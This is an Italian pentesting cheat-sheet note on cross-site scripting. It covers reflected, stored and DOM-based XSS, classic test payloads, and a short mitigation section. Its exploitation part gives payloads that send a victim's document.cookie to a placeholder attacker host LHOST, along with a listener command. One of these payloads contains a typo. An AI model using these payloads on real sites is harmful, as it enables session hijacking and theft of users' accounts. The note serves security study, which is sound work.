L'app riflette/memorizza input dell'utente nella pagina senza encoding, così il browser della vittima esegue JavaScript controllato da te. L'esecuzione avviene nel browser della vittima, non sul server.

## Tipi
- Reflected: il payload è nella richiesta e torna subito nella risposta. Richiede di far cliccare un link alla vittima.
- Stored/Persistent: il payload viene salvato sul server e colpisce ogni utente che vede la pagina.
- DOM-based: la vulnerabilità è nel JavaScript lato client che scrive input nel DOM (innerHTML, document.write, location.hash) senza sanitizzazione. Il payload può non passare mai dal server.

## Test classici

```
	<script>alert(1)</script>
	
	"><script>alert(1)</script>
	
	<img src=x onerror=alert(1)>
	
	<svg onload=alert(1)>
	
	'"><svg/onload=alert(document.domain)>	
```

## Sfruttamento

### Furto cookie di sessione

```
	<script> new Image().src='http://LHOST/c?'+doicument.cookie</script>
	<script>fetch('http://LHOST/c?'+document.cookie)</script>
```
- document.cookie legge i cookie non HttpOnly, li mandi al server in ascolto
```
	python3 -m http.server 80
```

Keylogger / phishing in pagina / azioni con la sessione della vittima.

### Mitigazione

Output encoding contestuale (HTML/attr/JS/URL), Content-Security-Policy, cookie HttpOnly + Secure + SamSite, sanitizzazione (DOMPurify) per HTML "ricco", framework che fanno escaping di default.

---

Vedi anche: [[CSRF]] · [[Authentication & Session Attacks]]